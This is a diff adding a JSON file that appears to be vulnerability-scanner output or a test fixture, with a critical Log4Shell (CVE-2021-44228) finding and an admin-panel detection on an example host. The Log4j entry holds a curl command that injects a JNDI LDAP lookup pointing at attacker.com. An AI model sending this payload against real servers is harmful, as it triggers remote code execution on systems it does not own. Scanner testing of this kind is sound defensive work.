@@ -1,0 +1,36 @@
+[
+  {
+    "templateID": "cve-2021-44228",
+    "info": {
+      "name": "Apache Log4j RCE",
+      "severity": "critical",
+      "description": "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.",
+      "reference": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228", "https://logging.apache.org/log4j/2.x/security.html"],
+      "classification": {
+        "cwe-id": ["CWE-502"],
+        "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss-score": 10.0
+      },
+      "remediation": "Upgrade to Log4j 2.17.0 or later"
+    },
+    "type": "http",
+    "host": "https://vulnerable-app.example.com",
+    "matched": "https://vulnerable-app.example.com/api/login",
+    "timestamp": "2024-01-15T10:30:00Z",
+    "matcher-name": "log4j-rce",
+    "curl-command": "curl -H 'X-Api-Key: ${jndi:ldap://attacker.com/a}' https://vulnerable-app.example.com/api/login"
+  },
+  {
+    "templateID": "exposed-panels-detect",
+    "info": {
+      "name": "Admin Panel Detected",
+      "severity": "info",
+      "description": "An administrative panel was detected on the target.",
+      "reference": []
+    },
+    "type": "http",
+    "host": "https://vulnerable-app.example.com",
+    "matched": "https://vulnerable-app.example.com/admin",
+    "timestamp": "2024-01-15T10:31:00Z"
+  }
+]
